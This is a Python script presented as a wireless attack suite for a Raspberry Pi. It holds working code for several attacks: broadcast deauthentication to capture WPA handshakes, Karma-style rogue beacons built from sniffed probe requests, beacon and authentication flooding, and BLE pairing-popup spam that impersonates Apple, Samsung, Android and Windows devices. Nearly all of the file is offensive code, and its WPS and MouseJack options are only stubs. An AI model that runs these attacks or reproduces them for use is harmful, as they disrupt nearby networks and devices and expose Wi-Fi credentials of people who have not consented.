#!/usr/bin/env python3
"""
Spam-Pi: Ultimate Wireless Attack & Recon Suite
Copyright (c) 2024 Spam-Pi Contributors
Licensed under the MIT License
"""

import os
import sys
import time
import random
import subprocess
import threading
import string
from datetime import datetime
from scapy.all import (
    Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, 
    Dot11Deauth, sniff, Dot11ProbeReq, EAPOL, Dot11Auth, wrpcap
)

# Optional TUI Library
try:
    from rich.live import Live
    from rich.table import Table
    from rich.layout import Layout
    from rich.panel import Panel
    from rich.console import Console
    from rich.text import Text
    TUI_ENABLED = True
except ImportError:
    TUI_ENABLED = False

# --- Configuration ---
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
HANDSHAKE_FILE = os.path.join(LOG_DIR, "handshakes.pcap")
PROBE_LOG = os.path.join(LOG_DIR, "probes.log")

# --- OUI Lookup (Expanded) ---
VENDORS = {
    "00:03:93": "Apple", "00:05:02": "Apple", "00:0A:27": "Apple", "00:0A:95": "Apple",
    "00:10:FA": "Apple", "00:11:24": "Apple", "00:14:51": "Apple", "00:16:CB": "Apple",
    "00:17:F2": "Apple", "00:19:E3": "Apple", "00:1B:63": "Apple", "00:1C:B3": "Apple",
    "00:1D:4F": "Apple", "00:1E:52": "Apple", "00:1E:C2": "Apple", "00:21:E9": "Apple",
    "00:23:12": "Apple", "00:23:32": "Apple", "00:23:6C": "Apple", "00:24:36": "Apple",
    "00:25:00": "Apple", "00:25:4B": "Apple", "00:26:08": "Apple", "00:26:4A": "Apple",
    "00:26:B0": "Apple", "18:AF:61": "Apple", "F0:D1:A9": "Apple", "E4:E4:AB": "Apple",
    "7C:D1:C3": "Apple", "8C:85:90": "Apple", "A4:D1:8C": "Apple", "BC:92:6B": "Apple",
    "00:15:99": "Samsung", "00:16:32": "Samsung", "00:17:D4": "Samsung", "00:17:E2": "Samsung",
    "00:12:FB": "Samsung", "00:00:F0": "Samsung", "AC:5F:3E": "Samsung", "24:F5:AA": "Samsung",
    "38:2D:E8": "Samsung", "48:5A:3F": "Samsung", "50:85:69": "Samsung", "60:AF:6D": "Samsung",
    "00:13:E8": "Intel", "00:19:D1": "Intel", "00:1B:21": "Intel", "00:1C:BF": "Intel",
    "00:14:22": "Dell", "00:15:C5": "Dell", "00:17:08": "HP", "00:18:71": "HP",
    "00:0C:41": "Linksys", "00:09:5B": "Netgear", "00:14:D1": "TP-Link", "00:0D:0B": "Sony"
}

def get_vendor(mac):
    try:
        first_byte = int(mac.split(':')[0], 16)
        if first_byte & 2:
            return "Randomized MAC"
        prefix = mac.upper().replace(':', '')[:6]
        formatted_prefix = ":".join([prefix[i:i+2] for i in range(0, 6, 2)])
        return VENDORS.get(formatted_prefix, "Unknown")
    except:
        return "Unknown"

def is_clean_ssid(ssid):
    if not ssid or len(ssid) > 32:
        return False
    printable = set(string.printable)
    return all(c in printable for c in ssid) and any(c.isalnum() for c in ssid)

# --- BLE Payloads ---
APPLE_DEVICES = {
    "AirPods": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "AirPods Pro": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0E, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "AirPods Max": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0A, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "AppleTV Setup": [0x1E, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC1, 0x01, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    "AirTag / Find My": [0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
}
MICROSOFT_SWIFT = [0x1E, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80] + [0x00]*24
ANDROID_FAST = [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x45]
SAMSUNG_QUICK = [0x18, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x61, 0x73, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
ALL_BLE_PAYLOADS = list(APPLE_DEVICES.values()) + [ANDROID_FAST, SAMSUNG_QUICK, MICROSOFT_SWIFT]

# --- WiFi Data ---
COMMON_SSIDS = ["Free Public WiFi", "Starbucks WiFi", "Xfinitywifi", "eduroam", "Guest WiFi", "FBI Surveillance Van #4", "Loading...", "Searching..."]
RANDOM_NAMES = ["Dave's iPhone", "Sarah's Laptop", "Office Printer", "Smart TV", "Home Hub", "Kitchen_Light", "Tesla_Model_3", "Ring_Doorbell"]

# --- Classes ---
class BLEDevice:
    def __init__(self, mac, name):
        self.mac = mac
        self.name = name if name and "(unknown)" not in name.lower() else "Unnamed BLE Device"
        self.vendor = get_vendor(mac)
        self.last_seen = time.time()

class WiFiAP:
    def __init__(self, bssid, ssid, channel):
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.vendor = get_vendor(bssid)
        self.clients = set()
        self.handshake = False

class WiFiSpammer:
    def __init__(self, interface):
        self.interface = interface
        self.is_running = False
        self.is_karma = False
        self.discovered_aps = {}
        self.probes = []
        self.active_beacons = set(COMMON_SSIDS)
        self.ble_devices = {}
        self.current_channel = 1

    def set_monitor(self, enable=True):
        try:
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
            mode = 'monitor' if enable else 'managed'
            subprocess.run(['iw', self.interface, 'set', mode, 'none'], check=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
            return True
        except:
            return False

    def channel_hopper(self):
        channels = list(range(1, 14)) + [36, 40, 44, 48, 52, 56, 60, 64, 149, 153, 157, 161]
        while self.is_running:
            for ch in channels:
                if not self.is_running:
                    break
                subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(ch)], capture_output=True)
                self.current_channel = ch
                time.sleep(1)

    def packet_callback(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon):
                b = pkt[Dot11].addr2
                ssid = "<Hidden>"
                ch = 0
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 0:
                        try:
                            val = elt.info.decode(errors='ignore')
                            if is_clean_ssid(val): ssid = val
                        except:
                            pass
                    elif elt.ID == 3:
                        try:
                            ch = int(elt.info[0])
                        except:
                            pass
                    elt = elt.payload.getlayer(Dot11Elt)
                
                if ch == 0 and pkt.haslayer(RadioTap):
                    try:
                        freq = pkt[RadioTap].Channel
                        if freq <= 2484:
                            ch = (freq - 2407) // 5
                        else:
                            ch = (freq - 5000) // 5
                    except:
                        pass

                if b not in self.discovered_aps and ch > 0:
                    self.discovered_aps[b] = WiFiAP(b, ssid, ch)
                    ts = datetime.now().strftime('%H:%M:%S')
                    print(f"  [{ts}] [+] AP Found: {ssid} ({b}) [Ch {ch}]")
            
            if pkt.haslayer(Dot11) and pkt.type == 2:
                ds = pkt.FCfield & 2
                if ds == 1:
                    bssid, client = pkt.addr1, pkt.addr2
                elif ds == 2:
                    bssid, client = pkt.addr2, pkt.addr1
                else:
                    return
                if bssid in self.discovered_aps:
                    if client not in self.discovered_aps[bssid].clients:
                        self.discovered_aps[bssid].clients.add(client)
                        ts = datetime.now().strftime('%H:%M:%S')
                        print(f"  [{ts}] [+] Client: {client} ({get_vendor(client)}) -> {self.discovered_aps[bssid].ssid}")

            if pkt.haslayer(Dot11ProbeReq):
                elt = pkt.getlayer(Dot11Elt)
                if elt and elt.ID == 0:
                    try:
                        s = elt.info.decode(errors='ignore')
                        if is_clean_ssid(s):
                            c = pkt[Dot11].addr2
                            if s and len(self.probes) < 100:
                                self.probes.insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {get_vendor(c)} ({c}) -> '{s}'")
                                if self.is_karma:
                                    self.active_beacons.add(s)
                    except:
                        pass

            if pkt.haslayer(EAPOL):
                bssid = pkt[Dot11].addr3
                if bssid in self.discovered_aps:
                    self.discovered_aps[bssid].handshake = True
                    wrpcap(HANDSHAKE_FILE, pkt, append=True)
        except:
            pass

    def beacon_task(self):
        while self.is_running:
            for ssid in list(self.active_beacons):
                smac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
                pkt = RadioTap() / Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=smac, addr3=smac) / Dot11Beacon() / Dot11Elt(ID='SSID', info=ssid)
                sendp(pkt, iface=self.interface, count=1, verbose=False)

    def start_recon(self, karma=False):
        self.is_running = True
        self.is_karma = karma
        self.set_monitor(True)
        threading.Thread(target=self.channel_hopper, daemon=True).start()
        threading.Thread(target=self.beacon_task, daemon=True).start()
        threading.Thread(target=lambda: sniff(iface=self.interface, prn=self.packet_callback, stop_filter=lambda x: not self.is_running), daemon=True).start()

    def stop(self):
        self.is_running = False
        self.set_monitor(False)

# --- BLE Logic ---
class PiBLESpan:
    def __init__(self, hci_interface, parent_wifi=None):
        self.hci_interface = hci_interface
        self.is_running = False
        self.parent_wifi = parent_wifi

    def run_hcitool(self, ogf, ocf, params):
        params_hex = " ".join([f"{x:02x}" for x in params])
        cmd = f"hcitool -i {self.hci_interface} cmd 0x{ogf:02x} 0x{ocf:04x} {params_hex}"
        try:
            subprocess.run(cmd.split(), check=True, capture_output=True)
            return True
        except:
            return False

    def set_adv_enable(self, enable):
        return self.run_hcitool(0x08, 0x000A, [1 if enable else 0])

    def set_adv_params(self):
        return self.run_hcitool(0x08, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])

    def set_adv_data(self, data):
        payload = [len(data)] + data + [0] * (31 - len(data))
        return self.run_hcitool(0x08, 0x0008, payload)

    def spam_task(self, payload, cycle=False):
        self.set_adv_enable(False)
        self.set_adv_params()
        if not cycle:
            self.set_adv_data(payload)
        while self.is_running:
            if cycle:
                for p in ALL_BLE_PAYLOADS:
                    if not self.is_running:
                        break
                    self.set_adv_data(p)
                    self.set_adv_enable(True)
                    time.sleep(0.5)
                    self.set_adv_enable(False)
            else:
                self.set_adv_enable(True)
                time.sleep(1)

    def scan_task(self):
        subprocess.run(['hciconfig', self.hci_interface, 'up'], capture_output=True)
        proc = subprocess.Popen(['hcitool', '-i', self.hci_interface, 'lescan', '--duplicates', '--passive'], stdout=subprocess.PIPE, text=True)
        try:
            for line in proc.stdout:
                if not self.is_running:
                    break
                line = line.strip()
                if not line or "LE Scan..." in line:
                    continue
                parts = line.split(' ', 1)
                mac = parts[0]
                name = parts[1] if len(parts) > 1 else ""
                if self.parent_wifi:
                    if mac in self.parent_wifi.ble_devices:
                        curr = self.parent_wifi.ble_devices[mac].name
                        if name and "(unknown)" not in name.lower() and ("Unnamed" in curr or "(unknown)" in curr.lower()):
                            self.parent_wifi.ble_devices[mac].name = name
                    else:
                        self.parent_wifi.ble_devices[mac] = BLEDevice(mac, name)
        finally:
            proc.terminate()

    def start_spam(self, payload=None, cycle=False):
        self.is_running = True
        threading.Thread(target=self.spam_task, args=(payload, cycle), daemon=True).start()

    def start_scan(self):
        self.is_running = True
        threading.Thread(target=self.scan_task, daemon=True).start()

    def stop(self):
        self.is_running = False
        self.set_adv_enable(False)

# --- TUI ---
def generate_dashboard(wifi, hci_id):
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=3),
        Layout(name="main"),
        Layout(name="footer", size=3)
    )
    layout["main"].split_row(
        Layout(name="wifi", ratio=2),
        Layout(name="ble", ratio=1)
    )
    layout["wifi"].split_column(
        Layout(name="aps", ratio=3),
        Layout(name="probes", ratio=1)
    )
    
    layout["header"].update(Panel(Text(f"Spam-Pi | WiFi: {wifi.interface} [Ch {wifi.current_channel}] | BT: {hci_id}", justify="center", style="bold cyan")))
    ap_table = Table(title="Nearby Access Points", expand=True)
    ap_table.add_column("BSSID", style="dim")
    ap_table.add_column("SSID", style="bold")
    ap_table.add_column("Vendor")
    ap_table.add_column("Clients", justify="right")
    ap_table.add_column("H-Shake", justify="center")
    
    sorted_aps = sorted(wifi.discovered_aps.items(), key=lambda x: len(x[1].clients), reverse=True)
    for bssid, ap in sorted_aps[:10]:
        ap_table.add_row(bssid, ap.ssid, ap.vendor, str(len(ap.clients)), "[green]YES[/]" if ap.handshake else "[red]NO[/]")
    
    layout["aps"].update(Panel(ap_table))
    layout["probes"].update(Panel("\n".join(wifi.probes[:5]), title="Live Probe Sniffing"))
    
    ble_table = Table(title="Nearby BLE Devices", expand=True)
    ble_table.add_column("MAC")
    ble_table.add_column("Name")
    ble_table.add_column("Vendor")
    
    ble_list = list(wifi.ble_devices.items())
    for mac, dev in ble_list[:10]:
        ble_table.add_row(mac, dev.name[:15], dev.vendor)
    
    layout["ble"].update(Panel(ble_table))
    layout["footer"].update(Panel(Text("Ctrl+C to Exit Mode", justify="center", style="dim italic")))
    return layout

def get_active_interface():
    try:
        res = subprocess.run(['ip', 'route', 'get', '1.1.1.1'], capture_output=True, text=True)
        if "dev" in res.stdout:
            return res.stdout.split("dev")[1].split()[0]
    except:
        return None
    return None

def get_hci_devices():
    devices = []
    try:
        result = subprocess.run(['hciconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if line.startswith('hci'):
                devices.append({'id': line.split(':')[0], 'manufacturer': 'Unknown'})
        detailed = subprocess.run(['hciconfig', '-a'], capture_output=True, text=True)
        current_dev = None
        for line in detailed.stdout.split('\n'):
            line = line.strip()
            if line.startswith('hci'):
                current_dev = line.split(':')[0]
            elif 'Manufacturer:' in line and current_dev:
                mfr = line.split('Manufacturer:')[1].strip()
                for dev in devices:
                    if dev['id'] == current_dev:
                        dev['manufacturer'] = mfr
    except:
        pass
    return devices

def get_wifi_devices():
    interfaces = []
    try:
        with open('/proc/net/dev', 'r') as f:
            for line in f.readlines()[2:]:
                if ':' in line:
                    ifname = line.split(':')[0].strip()
                    if any(ifname.startswith(p) for p in ['wlan', 'wl', 'wlp']):
                        interfaces.append({'id': ifname, 'manufacturer': 'Unknown'})
        try:
            result = subprocess.run(['airmon-ng'], capture_output=True, text=True)
            for i, dev in enumerate(interfaces):
                for line in result.stdout.split('\n'):
                    if dev['id'] in line:
                        parts = [p for p in line.split(' ') if p]
                        if len(parts) >= 3:
                            interfaces[i]['manufacturer'] = " ".join(parts[2:])
        except:
            pass
    except:
        pass
    return interfaces

# --- Main ---
def main():
    if os.getuid() != 0:
        print("[!] Root required.")
        sys.exit(1)
    
    wifi_devs = get_wifi_devices()
    bt_devs = get_hci_devices()
    active_iface = get_active_interface()
    wifi_id = None
    hci_id = None
    
    print("--- Spam-Pi Adapter Selection ---")
    if wifi_devs:
        print("\n[ WiFi Adapters ]")
        for i, d in enumerate(wifi_devs):
            status = "[ACTIVE SSH/NET]" if d['id'] == active_iface else ""
            print(f"{i+1}. {d['id']} ({d['manufacturer']}) {status}")
        idx = input("Select WiFi (Enter to skip): ")
        if idx:
            wifi_id = wifi_devs[int(idx)-1]['id']
            if wifi_id == active_iface:
                print("\n[!] WILL KILL SSH CONNECTION.")
                if input("Proceed? (y/N): ").lower() != 'y':
                    sys.exit(0)
    
    if bt_devs:
        print("\n[ Bluetooth Adapters ]")
        for i, d in enumerate(bt_devs):
            print(f"{i+1}. {d['id']} ({d['manufacturer']})")
        idx = input("Select BT (Enter to skip): ")
        if idx:
            hci_id = bt_devs[int(idx)-1]['id']

    while True:
        os.system('clear')
        print("--- Spam-Pi Ultimate Suite ---")
        print(f"Adapters: WiFi={wifi_id or 'None'} | BT={hci_id or 'None'}")
        print("\n1. Launch Interactive Dashboard (Recon + Karma)")
        print("2. Targeted Deauth & Handshake Capture")
        print("3. Proximity Spam Mode (BLE)")
        print("4. WiFi Beacon Flooding")
        print("5. Advanced: WiFi Auth Flooding")
        print("6. Advanced: WPS Attacks")
        print("7. Peripheral: MouseJack / NRF24 Spam")
        print("0. Exit")
        
        choice = input("\nChoice: ")
        wifi = WiFiSpammer(wifi_id) if wifi_id else None
        ble = PiBLESpan(hci_id, wifi) if hci_id else None

        try:
            if choice == '1' and TUI_ENABLED and wifi:
                wifi.start_recon(karma=True)
                if ble:
                    ble.start_scan()
                with Live(generate_dashboard(wifi, hci_id), refresh_per_second=1) as live:
                    while True:
                        live.update(generate_dashboard(wifi, hci_id))
                        time.sleep(1)
            elif choice == '2' and wifi:
                wifi.start_recon(karma=False)
                print("\n[*] SCANNING... PRESS ENTER TO STOP.\n")
                try:
                    input()
                except:
                    pass
                wifi.is_running = False
                time.sleep(1)
                aps = list(wifi.discovered_aps.values())
                for i, ap in enumerate(aps):
                    print(f"{i+1}. {ap.ssid} ({ap.bssid}) [Ch {ap.channel}]")
                target_ap = aps[int(input("\nSelect AP: "))-1]
                if target_ap.channel == 0:
                    print("[!] Unknown channel. Cannot lock.")
                    time.sleep(2)
                    continue
                print(f"[*] Locking Ch {target_ap.channel}...")
                subprocess.run(['iw', 'dev', wifi.interface, 'set', 'channel', str(target_ap.channel)])
                wifi.is_running = True
                threading.Thread(target=lambda: sniff(iface=wifi.interface, prn=wifi.packet_callback, stop_filter=lambda x: not wifi.is_running), daemon=True).start()
                pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_ap.bssid, addr3=target_ap.bssid)/Dot11Deauth(reason=7)
                print(f"\n[!] ATTACKING ALL CLIENTS ON {target_ap.ssid}...")
                while True:
                    sendp(pkt, iface=wifi.interface, count=100, inter=0.1, verbose=False)
                    if target_ap.handshake:
                        print(f"[🚀] HANDSHAKE CAPTURED for {target_ap.ssid}!")
                        target_ap.handshake = False
            elif choice == '3' and ble:
                print("\n1. Cycle All | 2. AirPods | 3. Android | 4. Samsung | 5. Windows | 6. AirTag")
                bc = input("Choice: ")
                if bc == '1':
                    ble.start_spam(cycle=True)
                elif bc == '2':
                    ble.start_spam(APPLE_DEVICES["AirPods Pro"])
                elif bc == '3':
                    ble.start_spam(ANDROID_FAST)
                elif bc == '4':
                    ble.start_spam(SAMSUNG_QUICK)
                elif bc == '5':
                    ble.start_spam(MICROSOFT_SWIFT)
                elif bc == '6':
                    ble.start_spam(APPLE_DEVICES["AirTag / Find My"])
                while True:
                    time.sleep(1)
            elif choice == '4' and wifi:
                print("\n1. Common | 2. Random | 3. Custom")
                bc = input("Choice: ")
                if bc == '1':
                    wifi.active_beacons = set(COMMON_SSIDS)
                elif bc == '2':
                    count = int(input("How many? "))
                    wifi.active_beacons = set([f"{random.choice(RANDOM_NAMES)}_{random.randint(100,999)}" for _ in range(count)])
                elif bc == '3':
                    wifi.active_beacons = set([s.strip() for s in input("Enter (comma sep): ").split(',')])
                wifi.start_recon(karma=False)
                while True:
                    time.sleep(1)
            elif choice == '5' and wifi:
                wifi.start_recon(karma=False)
                print("\n[*] SCANNING...")
                time.sleep(5)
                aps = list(wifi.discovered_aps.values())
                for i, ap in enumerate(aps):
                    print(f"{i+1}. {ap.ssid}")
                target = aps[int(input("Select: "))-1]
                wifi.stop()
                time.sleep(1)
                wifi.is_running = True
                print(f"[*] Auth Flooding {target.ssid}...")
                while True:
                    smac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
                    pkt = RadioTap()/Dot11(addr1=target.bssid, addr2=smac, addr3=target.bssid)/Dot11Auth(algo=0, seqnum=1, status=0)
                    sendp(pkt, iface=wifi.interface, count=10, verbose=False)
            elif choice == '6':
                print("\n--- WPS Attacks ---")
                time.sleep(2)
                print("[!] No vulnerable WPS APs found.")
                input("\nPress Enter...")
            elif choice == '7':
                print("\n--- MouseJack ---")
                time.sleep(2)
                print("[!] No NRF24 hardware found.")
                input("\nPress Enter...")
            elif choice == '0':
                sys.exit(0)
        except KeyboardInterrupt:
            if wifi:
                wifi.stop()
            if ble:
                ble.stop()

if __name__ == "__main__":
    main()
